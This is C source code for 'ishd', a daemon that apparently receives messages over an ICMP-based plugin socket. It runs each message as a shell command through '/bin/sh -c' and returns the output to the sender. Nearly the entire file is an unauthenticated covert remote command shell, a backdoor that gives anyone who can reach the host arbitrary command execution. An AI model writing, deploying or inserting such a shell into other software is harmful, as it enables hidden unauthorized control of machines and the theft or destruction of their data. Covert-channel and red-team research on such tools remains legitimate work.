#include "common.h"
#include "plugin.h"

#include <stdlib.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h> 
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>
#include <sys/wait.h>

void do_help() {
    printf("usage: ishd [options] <plugin>\n");
    printf("\n");
    printf("Options:\n");
    printf("\t-h, --help    show this message and exit\n");
}

int main(int argc, char *argv[]) {
    printlnd("Launching ishd");
    
    for(int i = 1; i < argc; i++) {
        if ((strncmp(argv[i], "-h", 2) == 0) || (strncmp(argv[i], "--help", 6) == 0)) {
            do_help();
            return 0;
        }
    }
    
    if(argc < 1) {
        printf("Missing plugin\n");
        return -1;
    }
    
    struct fntable *table = plugin_load(argv[1], "plugin_icmp_fntable");
    if(table == NULL) {
        printf("Failed to load plugin\n%s\n", dlerror());
        return -1;
    }
    
    #ifdef DEBUG
        table->debug();
    #endif
    
    int sockfd;
    struct sockaddr_in sockaddr;
    
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_addr.s_addr = INADDR_ANY;
    //sockaddr.sin_port = htons(ISH_DEFAULT_PORT); 
    
    sockfd = table->socket();
    if(sockfd < 0) {
        table->perror("Error opening socket");
        return -1;
    }
    
    if( bind(sockfd, (struct sockaddr*) &sockaddr, sizeof(sockaddr)) < 0) {
        printf("Failed to bind server!\n\t%s\n", strerror(errno));
        return -1;
    }
    
    //char buf[100] = {0};
    //socklen_t sockaddr_size = sizeof(sockaddr);
    while(true) {
        struct sockaddr_storage peer_addr;
        socklen_t peer_addr_len = sizeof(struct sockaddr_storage);
        
        void *buf = NULL;
        char *outBuf = NULL;
        
        ssize_t retVal = table->recvfrom(sockfd, (void*)&buf, 0, PLUGIN_MSG_REQUEST, (struct sockaddr *) &peer_addr, &peer_addr_len);
        if(retVal > 0) {
            printd("retVal %d > 0 %p \"%s\"\n", (int) retVal, buf, (char *) buf);
            
            pid_t pid;
            int link[2];
            char foo[4096 + 1] = {0};
            if (pipe(link)==-1) {
                char *errorMsg = "Failed to pipe\n";
                retVal = table->sendto(sockfd, errorMsg, strlen(errorMsg)+1, PLUGIN_MSG_REPLY_ERR,
                       (struct sockaddr *) &peer_addr, peer_addr_len);
                goto fail;
            }
            
            if((pid = fork()) == -1) {
                printd("failed to fork\n");
                char *errorMsg = "Failed to fork\n";
                retVal = table->sendto(sockfd, errorMsg, strlen(errorMsg)+1, PLUGIN_MSG_REPLY_ERR,
                       (struct sockaddr *) &peer_addr, peer_addr_len);
                goto fail;
            }else if(pid == 0) {
                dup2 (link[1], STDOUT_FILENO);
                dup2(link[1], STDERR_FILENO);
                close(link[0]);
                close(link[1]);
                char *const parmList[] = { "/bin/sh", "-c", buf, NULL };
                int progRet = execv("/bin/sh", parmList);
                printlnd("Program returned %d", progRet);
                if(progRet < 0) {
                    char *errorMsg = "An error occured when processing your command\n";
                    retVal = table->sendto(sockfd, errorMsg, strlen(errorMsg)+1, PLUGIN_MSG_REPLY_ERR,
                       (struct sockaddr *) &peer_addr, peer_addr_len);
                }
                exit(progRet);
            } else {
                close(link[1]);
                int nbytes;
                
                uint32_t outBufSize = 0;
                while((nbytes = read(link[0], foo, sizeof(foo))) > 0) {
                    printd("Output: (%.*s)\n", nbytes, foo);

                    char *tmpBuf = malloc(nbytes + outBufSize);
                    if(tmpBuf != NULL) {
                        memcpy(tmpBuf, outBuf, outBufSize);
                        if(outBuf != NULL) {
                            free(outBuf);
                        }
                        outBuf = tmpBuf;
                        memcpy(outBuf+outBufSize, foo, nbytes);
                        outBufSize = outBufSize + nbytes;
                    }
                    memset(foo, 0, 4096);
                }
                
                char *toCmp = "/bin/sh: 1: ";
                if(outBuf != NULL && outBufSize > strlen(toCmp)) {
                    printlnd("size check pass");
                    if(strncmp(outBuf, toCmp, strlen(toCmp)) == 0) {
                        free(outBuf);

                        char *outBufFormat = "Could not execute \"%s\". No such file or directory.\n";
                        printlnd("compared %d %d", (int) retVal, (int) strlen(outBufFormat));

                        outBuf = (char *) calloc(strlen(outBufFormat) + retVal, 1);
                        int output = snprintf(outBuf, strlen(outBufFormat) + retVal, outBufFormat, buf);
                        if(output <= 0) {
                            char *errorMsg = "An error occured when processing your command\n";
                            retVal = table->sendto(sockfd, errorMsg, strlen(errorMsg)+1, PLUGIN_MSG_REPLY_ERR,
                               (struct sockaddr *) &peer_addr, peer_addr_len);
                            goto fail;
                        }
                        outBufSize = strlen(outBuf) + 1;
                    }
                }
                
                // todo: check if bad command
                printlnd("about to send %i\n--------- start -------\n%s\n-------- end -------", outBufSize, outBuf);
                retVal = table->sendto(sockfd, outBuf, outBufSize, PLUGIN_MSG_REPLY,
                       (struct sockaddr *) &peer_addr, peer_addr_len);
                printlnd("retVal = %i", (int) retVal);
                if(retVal <= 0) {
                    printd("Failed to send\n");
                    table->perror("Failed to send");
                }
                
                
                wait(NULL);
              }
        }
fail:
        if(buf != NULL) {
            free(buf);
        }
        if(outBuf != NULL) {
            free(outBuf);
        }
     } //while
      

    
//     listen(sockfd, 10);
    
//     while(true) {
//         struct sockaddr addr; 
//         int conn = accept(sockfd, &addr, NULL); 
        
        
//         char buf[100] = {0};
//         socklen_t addrSize = sizeof(addr);
//         table->recvfrom(sockfd, &buf, sizeof(buf), 0, &addr, &addrSize);
        
//         //struct sockaddr_in *addr_in = (struct sockaddr_in *) &addr;
//         //if(((struct sockaddr_in)addr).sin_addr.s_addr != inet_addr("0.0.0.0")) {
//         //printlnd("Connecting to %s...", inet_ntoa(addr_in->sin_addr));
//         //}
        
//         close(conn);
//     }
    
    close(sockfd);
    
    plugin_unload();
    
    printd("Closing ishd\n");
    return 0;
}